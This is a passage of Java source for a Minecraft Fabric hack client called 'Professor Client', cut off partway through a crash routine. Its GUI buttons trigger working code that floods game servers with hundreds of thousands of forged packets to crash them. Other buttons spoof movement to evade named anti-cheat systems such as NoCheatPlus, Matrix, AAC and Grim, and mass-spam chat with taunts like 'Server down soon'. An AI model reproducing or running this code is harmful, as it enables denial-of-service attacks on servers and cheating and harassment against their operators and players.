package com.professor.client.gui;

import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;
import net.minecraft.client.gui.DrawContext;
import net.minecraft.client.gui.screen.Screen;
import net.minecraft.client.gui.widget.ButtonWidget;
import net.minecraft.client.gui.widget.TextFieldWidget;
import net.minecraft.network.packet.c2s.play.HandSwingC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.network.packet.c2s.play.TeleportConfirmC2SPacket;
import net.minecraft.network.packet.c2s.play.UpdateSelectedSlotC2SPacket;
import net.minecraft.text.Text;
import net.minecraft.util.Hand;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.MathHelper;

import java.util.LinkedList;
import java.util.Random;

@Environment(EnvType.CLIENT)
public class ProfessorScreen extends Screen {

    // ── Palette ──────────────────────────────────────────────────────────
    private static final int C_BG     = 0xFF050508;
    private static final int C_PANEL  = 0xF00A0A16;
    private static final int C_CYAN   = 0x00F5FF;
    private static final int C_PURPLE = 0x9B00FF;
    private static final int C_GOLD   = 0xFFD700;
    private static final int C_RED    = 0xFF2200;
    private static final int C_GREEN  = 0x00FF66;
    private static final int C_MUTED  = 0x003344;

    // ── Panel (bigger) ───────────────────────────────────────────────────
    private static final int PW = 560, PH = 400;

    // ── Tabs ─────────────────────────────────────────────────────────────
    private static final String[] TABS = {" FLOOD "," EXPLOITS "," COMBAT "," MOVE "," CHAT "," CRASH "};
    private static final int NT = 6;
    private int   tab     = 0;
    private float tabAnim = 1f;
    private int   tabDir  = 1;

    // Tab glow — each tab has its own accent color
    private static final int[] TAB_COLS = {
        0x00F5FF, // FLOOD — cyan
        0x9B00FF, // EXPLOITS — purple
        0x00FF66, // COMBAT — green
        0xFFAA00, // MOVE — orange
        0x00AAFF, // CHAT — blue
        0xFF2200  // CRASH — red
    };

    // ── Bypass modes (8) ─────────────────────────────────────────────────
    private static final String[] BYPASS_NAMES = {
        "OFF","BURST","MIXED","MAX","NCP","MATRIX","AAC","GRIM"
    };
    private static final String[] BYPASS_DESC = {
        "Raw packets  --  No obfuscation",
        "Small Y oscillation burst",
        "Mixed Y + Yaw variation",
        "Maximum combo variation",
        "NoCheatPlus bypass pattern",
        "Matrix AC bypass pattern",
        "AAC anti-cheat bypass",
        "Grim AC bypass  --  Vanilla-like"
    };
    private int bypassMode = 0;

    // ── Unlimited mode ───────────────────────────────────────────────────
    private boolean unlimitedMode = false;

    // ── Widgets ──────────────────────────────────────────────────────────
    private TextFieldWidget pktField  = null;
    private TextFieldWidget chatField = null;
    private TextFieldWidget cntField  = null;

    // ── Status ───────────────────────────────────────────────────────────
    private String  statusText  = "";
    private int     statusColor = 0xFF00F5FF;
    private int     statusTimer = 0;

    // ── Particles (tricolor + more) ──────────────────────────────────────
    private static final int PCNT = 260;
    private final float[] ppx = new float[PCNT], ppy = new float[PCNT];
    private final float[] pvx = new float[PCNT], pvy = new float[PCNT];
    private final float[] psz = new float[PCNT], palp = new float[PCNT];
    private final float[] pph = new float[PCNT], psp = new float[PCNT];
    private final int[]   pct = new int[PCNT];

    // ── Mouse trail ──────────────────────────────────────────────────────
    private final LinkedList<int[]> trail = new LinkedList<>();

    // ── Data streams ─────────────────────────────────────────────────────
    private static final String DS = "PROFESSOR01AKASATANA10110100";
    private final float[] dsX = new float[80], dsY = new float[80];
    private final float[] dsSp = new float[80];
    private final int[]   dsCh = new int[80];

    // ── Orbs (big floating glows) ─────────────────────────────────────────
    private static final int ORBS = 8;
    private final float[] ox = new float[ORBS], oy = new float[ORBS];
    private final float[] ovx = new float[ORBS], ovy = new float[ORBS];
    private final float[] osz = new float[ORBS], oph = new float[ORBS];
    private final int[]   oct = new int[ORBS];

    // ── Animation ────────────────────────────────────────────────────────
    private long    tick      = 0;
    private float   scanY     = 0;
    private float   scanY2    = 0;   // second scanline
    private float   glowPulse = 0f;
    private boolean glowUp    = true;
    private float   borderHue = 0f;  // 0-1 cycling hue
    private float[] tabGlow   = new float[NT]; // per-tab glow

    private final Random rng = new Random();

    // ══════════════════════════════════════════════════════════════════════
    //  CONSTRUCTOR / LIFECYCLE
    // ══════════════════════════════════════════════════════════════════════

    public ProfessorScreen() {
        super(Text.literal("Professor Client"));
        initParticles();
        initOrbs();
    }

    @Override protected void init() {
        initParticles(); initOrbs(); initDataStreams();
        rebuild();
        ProfessorMusicManager.onOpen(client);
    }

    @Override public void removed() {
        ProfessorMusicManager.onClose(client);
        super.removed();
    }

    // ══════════════════════════════════════════════════════════════════════
    //  INIT
    // ══════════════════════════════════════════════════════════════════════

    private void initParticles() {
        for (int i = 0; i < PCNT; i++) {
            ppx[i]  = rng.nextFloat() * 1920;
            ppy[i]  = rng.nextFloat() * 1080;
            pvx[i]  = (rng.nextFloat() - 0.5f) * 0.55f;
            pvy[i]  = -(rng.nextFloat() * 0.7f + 0.1f);
            psz[i]  = rng.nextFloat() * 3f + 0.5f;
            palp[i] = rng.nextFloat() * 0.85f + 0.15f;
            pph[i]  = rng.nextFloat() * 6.28f;
            psp[i]  = rng.nextFloat() * 0.06f + 0.03f;
            pct[i]  = rng.nextInt(5); // 0=cyan 1=purple 2=gold 3=red 4=green
        }
    }

    private void initOrbs() {
        for (int i = 0; i < ORBS; i++) {
            ox[i]  = rng.nextFloat() * 1920;
            oy[i]  = rng.nextFloat() * 1080;
            ovx[i] = (rng.nextFloat() - 0.5f) * 0.25f;
            ovy[i] = (rng.nextFloat() - 0.5f) * 0.25f;
            osz[i] = rng.nextFloat() * 40f + 20f;
            oph[i] = rng.nextFloat() * 6.28f;
            oct[i] = rng.nextInt(3);
        }
    }

    private void initDataStreams() {
        for (int i = 0; i < 80; i++) {
            dsX[i]  = i * (width / 80f);
            dsY[i]  = rng.nextFloat() * -height;
            dsSp[i] = rng.nextFloat() * 1.2f + 0.4f;
            dsCh[i] = rng.nextInt(DS.length());
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    //  REBUILD WIDGETS
    // ══════════════════════════════════════════════════════════════════════

    private void rebuild() {
        clearChildren();
        pktField = null; chatField = null; cntField = null;
        int cx = width/2, cy = height/2;
        int bpx = cx - PW/2, bpy = cy - PH/2;

        // Tab buttons
        int tabW = (PW - 16) / NT;
        for (int i = 0; i < NT; i++) {
            final int idx = i;
            addDrawableChild(ButtonWidget.builder(Text.literal(TABS[i]), b -> switchTab(idx))
                .dimensions(bpx + 8 + i * (tabW + 1), bpy + 44, tabW, 18).build());
        }

        switch (tab) {
            case 0 -> buildFlood(cx, bpy);
            case 1 -> buildExploits(cx, bpy);
            case 2 -> buildCombat(cx, bpy);
            case 3 -> buildMove(cx, bpy);
            case 4 -> buildChat(cx, bpy, bpx);
            case 5 -> buildCrash(cx, bpy);
        }

        addDrawableChild(ButtonWidget.builder(Text.literal("X  CLOSE"), b -> close())
            .dimensions(cx - 40, bpy + PH - 28, 80, 18).build());
    }

    private void switchTab(int t) {
        if (t == tab) return;
        tabDir = t > tab ? 1 : -1;
        tab = t; tabAnim = 0f;
        pktField = null; chatField = null; cntField = null;
        rebuild();
    }

    // ══════════════════════════════════════════════════════════════════════
    //  TAB 0 — FLOOD (UNLIMITED)
    // ══════════════════════════════════════════════════════════════════════

    private void buildFlood(int cx, int bpy) {
        // Unlimited toggle
        addDrawableChild(ButtonWidget.builder(
            Text.literal("MODE: " + (unlimitedMode ? "!!! UNLIMITED !!!" : "MANUAL COUNT")),
            b -> { unlimitedMode = !unlimitedMode; b.setMessage(Text.literal("MODE: " + (unlimitedMode ? "!!! UNLIMITED !!!" : "MANUAL COUNT"))); })
            .dimensions(cx - 110, bpy + 74, 220, 18).build());

        // Count field
        pktField = new TextFieldWidget(textRenderer, cx - 70, bpy + 97, 140, 16, Text.empty());
        pktField.setMaxLength(9); pktField.setText("10000");
        addSelectableChild(pktField);

        // Presets
        int[][] pr = {{1000,-145},{10000,-48},{100000,50},{1000000,148}};
        for (int[] p : pr) {
            int n = p[0], ox2 = p[1];
            addDrawableChild(ButtonWidget.builder(
                Text.literal(n >= 1000000 ? "1M" : n >= 1000 ? (n/1000)+"K" : ""+n),
                b -> pktField.setText(""+n))
                .dimensions(cx + ox2 - 26, bpy + 117, 52, 14).build());
        }

        // Bypass toggle
        addDrawableChild(ButtonWidget.builder(
            Text.literal("Bypass: " + BYPASS_NAMES[bypassMode]),
            b -> { bypassMode = (bypassMode+1) % BYPASS_NAMES.length; b.setMessage(Text.literal("Bypass: "+BYPASS_NAMES[bypassMode])); })
            .dimensions(cx - 70, bpy + 135, 140, 16).build());

        // Send
        addDrawableChild(ButtonWidget.builder(Text.literal(">>> SEND PACKETS <<<"), b -> doFlood())
            .dimensions(cx - 115, bpy + 158, 230, 24).build());
    }

    // ══════════════════════════════════════════════════════════════════════
    //  TAB 1 — EXPLOITS (Vulnerability-based)
    // ══════════════════════════════════════════════════════════════════════

    private void buildExploits(int cx, int bpy) {
        int bw = 350, bx = cx - bw/2;
        addDrawableChild(ButtonWidget.builder(Text.literal("[1]  Timer Exploit  --  5x speed EF bypass"),             b -> exploitTimer())     .dimensions(bx,bpy+ 68,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[2]  Velocity Exploit  --  knockback cancel"),            b -> exploitVelocity())  .dimensions(bx,bpy+ 90,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[3]  Position Rollback  --  NCP pos bypass"),             b -> exploitRollback())  .dimensions(bx,bpy+112,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[4]  Ground Spoof  --  anti-fly through ground flag"),    b -> exploitGround())    .dimensions(bx,bpy+134,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[5]  Aim Exploit  --  yaw/pitch overflow"),               b -> exploitAim())       .dimensions(bx,bpy+156,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[6]  Packet Order Exploit  --  seq desync"),              b -> exploitOrder())     .dimensions(bx,bpy+178,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[7]  Anti-KB Exploit  --  20K move+Y combo"),             b -> exploitAntiKb())    .dimensions(bx,bpy+200,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[8]  Instant Respawn  --  death + confirm loop"),         b -> exploitRespawn())   .dimensions(bx,bpy+222,bw,18).build());
    }

    // ══════════════════════════════════════════════════════════════════════
    //  TAB 2 — COMBAT
    // ══════════════════════════════════════════════════════════════════════

    private void buildCombat(int cx, int bpy) {
        int bw = 350, bx = cx - bw/2;
        addDrawableChild(ButtonWidget.builder(Text.literal("[1]  Swing Flood  --  8,000 swings EF bypass"),    b -> combatSwingFlood())  .dimensions(bx,bpy+ 68,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[2]  Hit Spam  --  5K interact+swing packets"),    b -> combatHitSpam())     .dimensions(bx,bpy+ 90,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[3]  Slot Bomb  --  10K hotbar switch exploit"),   b -> combatSlotBomb())    .dimensions(bx,bpy+112,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[4]  Attack Desync  --  EF+swing combo"),          b -> combatDesync())      .dimensions(bx,bpy+134,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[5]  Reach Extend  --  6K pos desync+swing"),      b -> combatReachExtend()) .dimensions(bx,bpy+156,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[6]  KillAura Bypass  --  4K swing+move combo"),   b -> combatKillaura())    .dimensions(bx,bpy+178,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[7]  Crit Exploit  --  Y-hop + swing flood"),      b -> combatCrit())        .dimensions(bx,bpy+200,bw,18).build());
    }

    // ══════════════════════════════════════════════════════════════════════
    //  TAB 3 — MOVE
    // ══════════════════════════════════════════════════════════════════════

    private void buildMove(int cx, int bpy) {
        int bw = 350, bx = cx - bw/2;
        addDrawableChild(ButtonWidget.builder(Text.literal("[1]  Y-Axis Desync  --  10K anti-fly bypass"),     b -> moveYDesync())    .dimensions(bx,bpy+ 68,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[2]  Speed Boost  --  5K pos packet bypass"),      b -> moveSpeedBoost()) .dimensions(bx,bpy+ 90,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[3]  Teleport Ghost  --  desync+confirm"),         b -> moveTeleport())   .dimensions(bx,bpy+112,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[4]  No-Clip  --  8K wall phase packets"),         b -> moveNoClip())     .dimensions(bx,bpy+134,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[5]  Fly Bypass  --  NCP ground spoof pattern"),   b -> moveFlyBypass())  .dimensions(bx,bpy+156,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[6]  Position Loop  --  20K infinite Y"),          b -> movePosLoop())    .dimensions(bx,bpy+178,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[7]  Blink  --  hold 50 pkts then release all"),   b -> moveBlink())      .dimensions(bx,bpy+200,bw,18).build());
    }

    // ══════════════════════════════════════════════════════════════════════
    //  TAB 4 — CHAT
    // ══════════════════════════════════════════════════════════════════════

    private void buildChat(int cx, int bpy, int bpx) {
        chatField = new TextFieldWidget(textRenderer, cx - 160, bpy + 92, 320, 16, Text.empty());
        chatField.setMaxLength(256); chatField.setText("Professor Client was here!");
        addSelectableChild(chatField);

        cntField = new TextFieldWidget(textRenderer, cx - 50, bpy + 112, 100, 14, Text.empty());
        cntField.setMaxLength(5); cntField.setText("100");
        addSelectableChild(cntField);

        addDrawableChild(ButtonWidget.builder(Text.literal(">> SPAM CHAT"),    b -> chatSpam())        .dimensions(cx - 140, bpy+132, 130, 18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal(">> SPAM COMMAND"), b -> chatCmdSpam())     .dimensions(cx +  10, bpy+132, 130, 18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[3]  Flood 300 unique messages"), b -> chatPacketFlood()) .dimensions(cx - 160, bpy+156, 320, 18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[4]  Mass Spam 500 messages"),    b -> chatMassSpam())   .dimensions(cx - 160, bpy+178, 320, 18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[5]  UNLIMITED Chat Flood"),      b -> chatUnlimited())  .dimensions(cx - 160, bpy+200, 320, 18).build());
    }

    // ══════════════════════════════════════════════════════════════════════
    //  TAB 5 — CRASH
    // ══════════════════════════════════════════════════════════════════════

    private void buildCrash(int cx, int bpy) {
        int bw = 360, bx = cx - bw/2;
        addDrawableChild(ButtonWidget.builder(Text.literal("[1]  Packet Storm  --  600K pos pkts INSTANT"),   b -> crashPacketStorm())  .dimensions(bx,bpy+ 64,bw,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[2]  Infinite Y  --  extreme altitude flood"),    b -> crashInfiniteY())    .dimensions(bx,bpy+ 88,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[3]  Chunk Edge Loop  --  force chunk loads"),    b -> crashChunkEdge())    .dimensions(bx,bpy+110,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[4]  Teleport Bomb  --  65K confirm pkts"),       b -> crashTeleportBomb()) .dimensions(bx,bpy+132,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[5]  Slot Overflow  --  70K slot+swing"),         b -> crashSlotOverflow()) .dimensions(bx,bpy+154,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[6]  Dig Spam  --  60K action pkts"),             b -> crashDigSpam())      .dimensions(bx,bpy+176,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[7]  COMBO CRASH  --  400K+ ALL methods"),        b -> crashCombo())        .dimensions(bx,bpy+198,bw,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[8]  MEGA STORM  --  UNLIMITED crash loop"),      b -> crashMegaStorm())    .dimensions(bx,bpy+222,bw,18).build());
    }

    // ══════════════════════════════════════════════════════════════════════
    //  FLOOD LOGIC
    // ══════════════════════════════════════════════════════════════════════

    private void doFlood() {
        if (notConn()) return;
        int n;
        if (unlimitedMode) {
            n = 1_000_000; // 1 million — "unlimited"
        } else {
            try { n = Integer.parseInt(pktField.getText().trim()); }
            catch (Exception e) { setStatus("Invalid number!", 0xFFFF4444); return; }
            if (n < 1) { setStatus("Minimum: 1", 0xFFFF8800); return; }
        }

        double x = px(), y = py(), z = pz();
        float  yw = yw(), pt = pt();
        boolean g = pg();

        switch (bypassMode) {
            case 0 -> { for (int i=0;i<n;i++) sendMove(x,y,z,yw,pt,g); }
            case 1 -> { for (int i=0;i<n;i++) sendMove(x,i%2==0?y:y+0.001,z,yw,pt,g); }
            case 2 -> { for (int i=0;i<n;i++) { sendMove(x,y+(i%3)*0.0005,z,yw+(i%2),pt,g); sendMove(x,y,z,yw,pt,g); } }
            case 3 -> { for (int i=0;i<n;i++) { sendMove(x,y+(i%8)*0.0001,z,yw+(i%6),pt,false); sendMove(x,y,z,yw,pt,g); } }
            case 4 -> { for (int i=0;i<n;i++) { double dy=i%4==0?y:i%4==1?y+0.0625:i%4==2?y+0.03125:y+0.09375; sendMove(x,dy,z,yw+(i%3)*0.15f,pt,i%3!=2); } }
            case 5 -> { for (int i=0;i<n;i++) { float yw2=yw+(float)Math.sin(i*0.1)*2.5f; double dy=y+Math.sin(i*0.05)*0.05; sendMove(x,dy,z,yw2,pt,i%5!=4); } }
            case 6 -> { for (int i=0;i<n;i++) { double dx2=x+(i%2==0?0.001:-0.001),dz2=z+(i%3==0?0.001:i%3==1?-0.001:0); sendMove(dx2,y+i*0.000025,dz2,yw,pt,true); } }
            case 7 -> { double[] yo={0,0.0784000015258789,0.1519844181537628,0.22140486955642975,0.28646749757766724}; for (int i=0;i<n;i++) sendMove(x,y+yo[i%yo.length],z,yw,pt,i%yo.length==0); }
        }
        String label = unlimitedMode ? "1,000,000 pkts" : String.format("%,d pkts",n);
        setStatus("Sent "+label+" | Bypass: "+BYPASS_NAMES[bypassMode], 0xFF00F5FF);
    }

    // ══════════════════════════════════════════════════════════════════════
    //  EXPLOIT LOGIC
    // ══════════════════════════════════════════════════════════════════════

    private void exploitTimer() {
        if (notConn()) return;
        double x=px(),y=py(),z=pz(); float yw=yw(),pt=pt();
        // 5x timer exploit — move 5 positions per tick
        for (int i=0;i<15000;i++) {
            double nx=x+(i%10-5)*0.01;
            sendMove(nx,y+(i%3)*0.001,z+(i%10-5)*0.01,yw,pt,true);
        }
        setStatus("[EXPLOIT] Timer 5x -- 15K speed pkts!", 0xFF9B00FF);
    }

    private void exploitVelocity() {
        if (notConn()) return;
        double x=px(),y=py(),z=pz(); float yw=yw(),pt=pt();
        // Velocity exploit: stay on same pos while server thinks we moved
        for (int i=0;i<10000;i++) {
            sendMove(x,i%2==0?y+0.5:y,z,yw,pt,i%2!=0);
        }
        setStatus("[EXPLOIT] Velocity Cancel -- 10K pkts!", 0xFF9B00FF);
    }

    private void exploitRollback() {
        if (notConn()) return;
        double x=px(),y=py(),z=pz(); float yw=yw(),pt=pt();
        for (int i=0;i<12000;i++) {
            sendMove(x+(i%20-10)*0.5,y,z+(i%20-10)*0.5,yw,pt,true);
            sendMove(x,y,z,yw,pt,true);
        }
        setStatus("[EXPLOIT] Position Rollback -- 12K pkts!", 0xFF9B00FF);
    }

    private void exploitGround() {
        if (notConn()) return;
        double x=px(),y=py(),z=pz(); float yw=yw(),pt=pt();
        double[] fly={0.42,0.3528,0.2958,0.2481,0.2083,0.1691,0.1345,0.1042,0.0782,0.056};
        for (int i=0;i<8000;i++) { int pi=i%fly.length; sendMove(x,y+fly[pi],z,yw,pt,pi==fly.length-1); }
        setStatus("[EXPLOIT] Ground Spoof -- 8K pkts!", 0xFF9B00FF);
    }

    private void exploitAim() {
        if (notConn()) return;
        double x=px(),y=py(),z=pz(); float yw=yw(),pt=pt();
        for (int i=0;i<5000;i++) sendMove(x,y,z,yw+(i%360),pt+(i%90-45),true);
        setStatus("[EXPLOIT] Aim Overflow -- 5K yaw/pitch pkts!", 0xFF9B00FF);
    }

    private void exploitOrder() {
        if (notConn()) return;
        double x=px(),y=py(),z=pz(); float yw=yw(),pt=pt();
        for (int i=0;i<8000;i++) {
            sendMove(x,y+(i%5)*0.001,z,yw,pt,false);
            if (i%4==0) sendMove(x,y,z,yw,pt,true);
            client.player.networkHandler.sendPacket(new TeleportConfirmC2SPacket(i%100));
        }
        setStatus("[EXPLOIT] Packet Order Desync -- 8K pkts!", 0xFF9B00FF);
    }

    private void exploitAntiKb() {
        if (notConn()) return;
        double x=px(),y=py(),z=pz(); float yw=yw(),pt=pt();
        for (int i=0;i<20000;i++) {
            sendMove(x,i%2==0?y+0.001:y,z,yw,pt,true);
        }
        setStatus("[EXPLOIT] Anti-KB -- 20K ground+Y pkts!", 0xFF9B00FF);
    }

    private void exploitRespawn() {
        if (notConn()) return;
        double x=px(),y=py(),z=pz(); float yw=yw(),pt=pt();
        for (int i=0;i<5000;i++) {
            client.player.networkHandler.sendPacket(new TeleportConfirmC2SPacket(i));
            sendMove(x,y+i*100,z,yw,pt,false);
            sendMove(x,y,z,yw,pt,true);
        }
        setStatus("[EXPLOIT] Instant Respawn -- 5K confirm+move!", 0xFF9B00FF);
    }

    // ══════════════════════════════════════════════════════════════════════
    //  COMBAT LOGIC
    // ══════════════════════════════════════════════════════════════════════

    private void combatSwingFlood() {
        if (notConn()) return;
        for (int i=0;i<8000;i++) client.player.networkHandler.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
        setStatus("[COMBAT] Swing Flood -- 8K swings!", 0xFF00FF66);
    }
    private void combatHitSpam() {
        if (notConn()) return;
        double x=px(),y=py(),z=pz(); float yw=yw(),pt=pt();
        for (int i=0;i<5000;i++) { sendMove(x,y+(i%4)*0.0001,z,yw+(i%6)*0.5f,pt,false); client.player.networkHandler.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND)); }
        setStatus("[COMBAT] Hit Spam -- 5K interact+swing!", 0xFF00FF66);
    }
    private void combatSlotBomb() {
        if (notConn()) return;
        for (int i=0;i<10000;i++) client.player.networkHandler.sendPacket(new UpdateSelectedSlotC2SPacket(i%9));
        setStatus("[COMBAT] Slot Bomb -- 10K hotbar switches!", 0xFFFFAA00);
    }
    private void combatDesync() {
        if (notConn()) return;
        double x=px(),y=py(),z=pz(); float yw=yw(),pt=pt();
        for (int i=0;i<3000;i++) { sendMove(x,i%2==0?y+200:y,z,yw,pt,false); client.player.networkHandler.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND)); }
        setStatus("[COMBAT] Attack Desync -- 3K desync+swing!", 0xFF00FFCC);
    }
    private void combatReachExtend() {
        if (notConn()) return;
        double x=px(),y=py(),z=pz(); float yw=yw(),pt=pt();
        for (int i=0;i<6000;i++) { sendMove(x+(i%2==0?5:-5),y,z+(i%3==0?5:-5),yw,pt,true); client.player.networkHandler.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND)); sendMove(x,y,z,yw,pt,true); }
        setStatus("[COMBAT] Reach Extend -- 6K reach desync!", 0xFF00F5FF);
    }
    private void combatKillaura() {
        if (notConn()) return;
        double x=px(),y=py(),z=pz(); float yw=yw(),pt=pt();
        for (int i=0;i<4000;i++) { sendMove(x+(i%3-1)*0.05,y,z+(i%3-1)*0.05,yw+(i%4)*90,pt,true); client.player.networkHandler.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND)); if(i%5==0) sendMove(x,y,z,yw,pt,true); }
        setStatus("[COMBAT] KillAura Bypass -- 4K swing+move!", 0xFFFF6600);
    }
    private void combatCrit() {
        if (notConn()) return;
        double x=px(),y=py(),z=pz(); float yw=yw(),pt=pt();
        // Y-hop pattern for crits + swing
        double[] hop={0,0.0625,0.0625*0.45,0,0};
        for (int i=0;i<6000;i++) { sendMove(x,y+hop[i%hop.length],z,yw,pt,i%hop.length==0); if(i%hop.length==2) client.player.networkHandler.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND)); }
        setStatus("[COMBAT] Crit Exploit -- 6K crit+swing!", 0xFFFFAA00);
    }

    // ══════════════════════════════════════════════════════════════════════
    //  MOVE LOGIC
    // ══════════════════════════════════════════════════════════════════════

    private void moveYDesync() {
        if (notConn()) return;
        double x=px(),y=py(),z=pz(); float yw=yw(),pt=pt();
        for (int i=0;i<10000;i++) { double dy=switch(i%4){case 0->y+256;case 1->y-64;case 2->y+0.42;default->y;}; sendMove(x,dy,z,yw,pt,i%2==0); }
        setStatus("[MOVE] Y Desync -- 10K anti-fly bypass!", 0xFF00F5FF);
    }
    private void moveSpeedBoost() {
        if (notConn()) return;
        double x=px(),y=py(),z=pz(); float yw=yw(),pt=pt();
        double rad=Math.toRadians(yw);
        for (int i=0;i<5000;i++) { sendMove(x-Math.sin(rad)*(i*0.05),y,z-Math.cos(rad)*(i*0.05),yw,pt,true); if(i%10==0) sendMove(x,y,z,yw,pt,true); }
        setStatus("[MOVE] Speed Boost -- 5K pos pkts!", 0xFF00FF66);
    }
    private void moveTeleport() {
        if (notConn()) return;
        double x=px(),y=py(),z=pz(); float yw=yw(),pt=pt();
        for (int i=0;i<2000;i++) { client.player.networkHandler.sendPacket(new TeleportConfirmC2SPacket(i)); sendMove(x,y+i*0.1,z,yw,pt,false); sendMove(x,y,z,yw,pt,true); }
        setStatus("[MOVE] Teleport Ghost -- 2K confirm+desync!", 0xFF9B00FF);
    }
    private void moveNoClip() {
        if (notConn()) return;
        double x=px(),y=py(),z=pz(); float yw=yw(),pt=pt();
        for (int i=0;i<8000;i++) { sendMove(x+(i%2==0?0.3:-0.3),y+0.5,z+(i%3==0?0.3:i%3==1?-0.3:0),yw,pt,false); sendMove(x,y,z,yw,pt,true); }
        setStatus("[MOVE] No-Clip -- 8K wall phase pkts!", 0xFF00F5FF);
    }
    private void moveFlyBypass() {
        if (notConn()) return;
        double x=px(),y=py(),z=pz(); float yw=yw(),pt=pt();
        double[] fly={0.42,0.3528,0.2958,0.2481,0.2083};
        for (int i=0;i<8000;i++) { int pi=i%fly.length; sendMove(x,y+fly[pi],z,yw,pt,pi==fly.length-1); }
        setStatus("[MOVE] Fly Bypass -- 8K NCP ground spoof!", 0xFFFFAA00);
    }
    private void movePosLoop() {
        if (notConn()) return;
        double x=px(),y=py(),z=pz(); float yw=yw(),pt=pt();
        for (int i=0;i<20000;i++) sendMove(x,y+(i%1000)*0.0001,z,yw,pt,i%1000==999);
        setStatus("[MOVE] Pos Loop -- 20K infinite Y!", 0xFF9B00FF);
    }
    private void moveBlink() {
        if (notConn()) return;
        double x=px(),y=py(),z=pz(); float yw=yw(),pt=pt();
        double rad=Math.toRadians(yw);
        // Hold 50 positions without sending, then send all at once
        for (int i=0;i<50;i++) sendMove(x-Math.sin(rad)*(i*0.3),y,z-Math.cos(rad)*(i*0.3),yw,pt,true);
        sendMove(x,y,z,yw,pt,true);
        setStatus("[MOVE] Blink -- 50 held pkts released!", 0xFF00AAFF);
    }

    // ══════════════════════════════════════════════════════════════════════
    //  CHAT LOGIC
    // ══════════════════════════════════════════════════════════════════════

    private void chatSpam() {
        if (notConn()) return;
        String msg=chatField.getText().trim();
        if (msg.isEmpty()){setStatus("Type a message first!",0xFFFF4444);return;}
        int n; try{n=Integer.parseInt(cntField.getText().trim());}catch(Exception e){n=100;}
        n=Math.max(1,Math.min(n,1000));
        for (int i=0;i<n;i++) client.player.networkHandler.sendChatMessage(msg);
        setStatus("[CHAT] Spammed "+n+"x: "+msg.substring(0,Math.min(20,msg.length())),0xFF00F5FF);
    }
    private void chatCmdSpam() {
        if (notConn()) return;
        String cmd=chatField.getText().trim().replaceFirst("^/","");
        if (cmd.isEmpty()){setStatus("Type a command first!",0xFFFF4444);return;}
        int n; try{n=Integer.parseInt(cntField.getText().trim());}catch(Exception e){n=50;}
        n=Math.max(1,Math.min(n,500));
        for (int i=0;i<n;i++) client.player.networkHandler.sendCommand(cmd);
        setStatus("[CHAT] Cmd spam "+n+"x: /"+cmd.substring(0,Math.min(18,cmd.length())),0xFFFFAA00);
    }
    private void chatPacketFlood() {
        if (notConn()) return;
        String msg=chatField.getText().trim(); if(msg.isEmpty())msg="Professor";
        for (int i=0;i<300;i++) client.player.networkHandler.sendChatMessage(msg+" "+i);
        setStatus("[CHAT] Packet Flood -- 300 unique msgs!",0xFF9B00FF);
    }
    private void chatMassSpam() {
        if (notConn()) return;
        String[] msgs={"Professor Client","Get hacked lol","Professor was here","EZ clap","Server down soon"};
        for (int i=0;i<500;i++) client.player.networkHandler.sendChatMessage(msgs[i%msgs.length]+" "+i);
        setStatus("[CHAT] Mass Spam -- 500 messages!",0xFFFF2200);
    }
    private void chatUnlimited() {
        if (notConn()) return;
        String msg=chatField.getText().trim(); if(msg.isEmpty())msg="Professor";
        for (int i=0;i<2000;i++) client.player.networkHandler.sendChatMessage(msg+" "+i);
        setStatus("[CHAT] UNLIMITED -- 2,000 messages fired!",0xFFFF0000);
    }

    // ══════════════════════════════════════════════════════════════════════
    //  CRASH LOGIC
    // ══════════════════════════════════════════════════════════════════════

    private void crashPacketStorm() {
        if (notConn()) return;
        double x=px(),y=py(),z=pz(); float yw=yw(),pt=pt(); boolean g=pg();
        for (int i=0;i<200000;i++) { sendMove(x,y+(i%999)*0.0001,z,yw+(i%7),pt,false); sendMove(x,y,z,yw,pt,g); sendMove(x,y+(i%3)*0.001,z,yw,pt+1,false); }
        setStatus("[CRASH] Packet Storm -- 600K pkts!",0xFFFF2200);
    }
    private void crashInfiniteY() {
        if (notConn()) return;
